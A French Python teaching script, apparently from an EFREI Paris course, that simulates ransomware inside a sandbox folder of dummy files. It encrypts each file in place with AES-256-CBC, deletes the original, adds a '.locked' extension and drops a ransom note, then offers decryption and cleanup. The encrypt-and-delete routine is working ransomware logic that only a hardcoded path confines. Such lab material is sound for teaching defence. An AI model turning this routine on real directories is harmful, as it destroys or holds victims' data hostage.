"""
SA5 - Script 03 : Ransomware Pédagogique (simulation contrôlée)
EFREI Paris — Yousfi Souheib
-------------------------------------------------
Package requis : pycryptodome
Installation   : pip install pycryptodome --break-system-packages

⚠️  AVERTISSEMENT CRITIQUE ⚠️
Ce script est STRICTEMENT réservé à un usage pédagogique
dans un environnement isolé (VM de lab).
Il ne chiffre QUE le répertoire ./sandbox_ransomware/.
NE MODIFIEZ PAS les chemins pour pointer vers de vraies données.
Tout déploiement sur des systèmes réels est un crime
(Code pénal : art. 323-2, peines jusqu'à 7 ans).
-------------------------------------------------
"""

import sys, subprocess, os, json, time, shutil
from datetime import datetime

def installer_package(package):
    print(f"[INFO] Installation de '{package}'...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", package,
                           "--break-system-packages", "-q"])
    print(f"[OK] '{package}' installé.\n")

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    installer_package("pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad

import base64

# ─────────────────────────────────────────────────────────────
#  Configuration — NE MODIFIEZ PAS CES CHEMINS
# ─────────────────────────────────────────────────────────────

SANDBOX_DIR    = "./sandbox_ransomware"   # ← SEUL répertoire affecté
CLE_FILE       = "./ransomware_key.json"  # Clé de déchiffrement (simulée)
NOTE_FILE      = os.path.join(SANDBOX_DIR, "LISEZ_MOI.txt")
EXTENSION_LOCK = ".locked"

# ─────────────────────────────────────────────────────────────
#  Utilitaires AES
# ─────────────────────────────────────────────────────────────

def chiffrer_fichier(chemin, cle, iv):
    """Chiffre un fichier en place (AES-CBC) et ajoute l'extension .locked"""
    with open(chemin, "rb") as f:
        data = f.read()
    cipher = AES.new(cle, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    
    chemin_locked = chemin + EXTENSION_LOCK
    with open(chemin_locked, "wb") as f:
        f.write(encrypted)
    os.remove(chemin)
    return chemin_locked

def dechiffrer_fichier(chemin_locked, cle, iv):
    """Déchiffre un fichier .locked et restaure l'original."""
    with open(chemin_locked, "rb") as f:
        data = f.read()
    cipher = AES.new(cle, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(data), AES.block_size)
    
    chemin_original = chemin_locked[:-len(EXTENSION_LOCK)]
    with open(chemin_original, "wb") as f:
        f.write(decrypted)
    os.remove(chemin_locked)
    return chemin_original

# ─────────────────────────────────────────────────────────────
#  Création de la sandbox (fichiers de test)
# ─────────────────────────────────────────────────────────────

def creer_sandbox():
    """Crée un répertoire de test avec des fichiers factices."""
    os.makedirs(SANDBOX_DIR, exist_ok=True)
    fichiers = {
        "document_important.txt": "Rapport Q1 2025\nChiffre d'affaires : 1 250 000 €\nRésultat net : 87 500 €",
        "notes_personnelles.txt": "Liste de courses :\n- Pain\n- Lait\n- Fromage\nRDV médecin : 14h",
        "rapport_stage.txt":      "Stage EFREI 2025 — Rapport de mi-parcours\nTravail réalisé : ...",
        "photo_description.txt":  "Description de photo de vacances — Données non sensibles",
    }
    for nom, contenu in fichiers.items():
        with open(os.path.join(SANDBOX_DIR, nom), "w", encoding="utf-8") as f:
            f.write(contenu)
    print(f"[OK] Sandbox créée dans '{SANDBOX_DIR}' avec {len(fichiers)} fichiers.")

def lister_sandbox():
    """Liste les fichiers dans la sandbox."""
    print(f"\n[Contenu de {SANDBOX_DIR}/]")
    try:
        for f in os.listdir(SANDBOX_DIR):
            chemin = os.path.join(SANDBOX_DIR, f)
            taille = os.path.getsize(chemin)
            print(f"  {'🔒' if f.endswith(EXTENSION_LOCK) else '📄'} {f}  ({taille} octets)")
    except FileNotFoundError:
        print("  (vide ou inexistant)")

# ─────────────────────────────────────────────────────────────
#  Phase de chiffrement (simulation ransomware)
# ─────────────────────────────────────────────────────────────

def phase_chiffrement():
    """
    Simule la phase de chiffrement d'un ransomware :
    chiffre tous les fichiers de la sandbox.
    """
    print("\n" + "█"*60)
    print("█  SIMULATION CHIFFREMENT RANSOMWARE                      █")
    print("█"*60)
    
    if not os.path.exists(SANDBOX_DIR):
        print("[ERREUR] Sandbox inexistante. Lancez d'abord 'Créer sandbox'.")
        return
    
    # Génération de la clé de session
    cle = get_random_bytes(32)
    iv  = get_random_bytes(16)
    
    # Sauvegarde de la clé (dans la réalité : envoyée au serveur C2 de l'attaquant)
    cle_data = {
        "cle": base64.b64encode(cle).decode(),
        "iv":  base64.b64encode(iv).decode(),
        "date": datetime.now().isoformat(),
        "note": "Dans un vrai ransomware, cette clé serait chez l'attaquant — inaccessible à la victime."
    }
    with open(CLE_FILE, "w") as f:
        json.dump(cle_data, f, indent=2)
    print(f"[*] Clé générée et sauvegardée dans '{CLE_FILE}' (simulation C2)")
    
    # Chiffrement des fichiers
    fichiers_chiffres = []
    for nom in os.listdir(SANDBOX_DIR):
        chemin = os.path.join(SANDBOX_DIR, nom)
        if os.path.isfile(chemin) and not nom.endswith(EXTENSION_LOCK):
            chiffrer_fichier(chemin, cle, iv)
            print(f"  🔒 Chiffré : {nom} → {nom}{EXTENSION_LOCK}")
            fichiers_chiffres.append(nom)
            time.sleep(0.1)
    
    # Note de rançon
    note = f"""
╔══════════════════════════════════════════════════════╗
║              VOS FICHIERS ONT ÉTÉ CHIFFRÉS          ║
║                  (SIMULATION PÉDAGOGIQUE)            ║
╚══════════════════════════════════════════════════════╝

Tous vos fichiers ont été chiffrés avec AES-256.
{len(fichiers_chiffres)} fichier(s) affecté(s).

Dans un vrai ransomware :
• La clé de déchiffrement serait chez l'attaquant.
• Vous devriez payer une rançon (souvent en Bitcoin).
• Même après paiement, la clé n'est pas garantie.

Algorithme utilisé : AES-256-CBC
Date de chiffrement : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

─── FIN DE LA SIMULATION — USAGE PÉDAGOGIQUE EFREI ───
"""
    with open(NOTE_FILE, "w", encoding="utf-8") as f:
        f.write(note)
    
    print(f"\n[OK] {len(fichiers_chiffres)} fichier(s) chiffré(s).")
    print(f"[OK] Note de rançon créée : {NOTE_FILE}")

# ─────────────────────────────────────────────────────────────
#  Phase de déchiffrement
# ─────────────────────────────────────────────────────────────

def phase_dechiffrement():
    """Restaure les fichiers en utilisant la clé sauvegardée."""
    print("\n" + "─"*60)
    print("  PHASE DE DÉCHIFFREMENT (clé disponible — simulation)")
    print("─"*60)
    
    if not os.path.exists(CLE_FILE):
        print("[ERREUR] Fichier de clé introuvable. Lancez d'abord le chiffrement.")
        return
    
    with open(CLE_FILE, "r") as f:
        cle_data = json.load(f)
    
    cle = base64.b64decode(cle_data["cle"])
    iv  = base64.b64decode(cle_data["iv"])
    
    restaures = 0
    for nom in os.listdir(SANDBOX_DIR):
        if nom.endswith(EXTENSION_LOCK):
            chemin = os.path.join(SANDBOX_DIR, nom)
            try:
                original = dechiffrer_fichier(chemin, cle, iv)
                print(f"  ✅ Restauré : {nom} → {os.path.basename(original)}")
                restaures += 1
            except Exception as e:
                print(f"  ❌ Échec : {nom} — {e}")
    
    # Suppression de la note de rançon
    if os.path.exists(NOTE_FILE):
        os.remove(NOTE_FILE)
    
    print(f"\n[OK] {restaures} fichier(s) restauré(s).")

# ─────────────────────────────────────────────────────────────
#  Programme principal
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════╗")
    print("║   SA5 - Script 03 : Ransomware Pédagogique          ║")
    print("╠══════════════════════════════════════════════════════╣")
    print("║  ⚠️  SIMULATION — SANDBOX ISOLÉE — EFREI PARIS      ║")
    print("╚══════════════════════════════════════════════════════╝\n")
    
    while True:
        print("\nMenu :")
        print("  1 - Créer la sandbox (fichiers de test)")
        print("  2 - Lister les fichiers")
        print("  3 - SIMULER le chiffrement (ransomware)")
        print("  4 - Déchiffrer (restaurer) les fichiers")
        print("  5 - Nettoyer (supprimer la sandbox)")
        print("  q - Quitter")
        
        choix = input("\nVotre choix : ").strip().lower()
        
        if choix == "1":
            creer_sandbox()
        elif choix == "2":
            lister_sandbox()
        elif choix == "3":
            conf = input("⚠️  Confirmer la simulation ? (oui/non) : ")
            if conf.lower() == "oui":
                phase_chiffrement()
            else:
                print("Annulé.")
        elif choix == "4":
            phase_dechiffrement()
        elif choix == "5":
            if os.path.exists(SANDBOX_DIR):
                shutil.rmtree(SANDBOX_DIR)
            for f in [CLE_FILE]:
                if os.path.exists(f):
                    os.remove(f)
            print("[OK] Sandbox nettoyée.")
        elif choix == "q":
            break
        else:
            print("Choix invalide.")
    
    print("\n🛡️  Contre-mesures réelles : sauvegardes 3-2-1, EDR, principe de moindre privilège.")
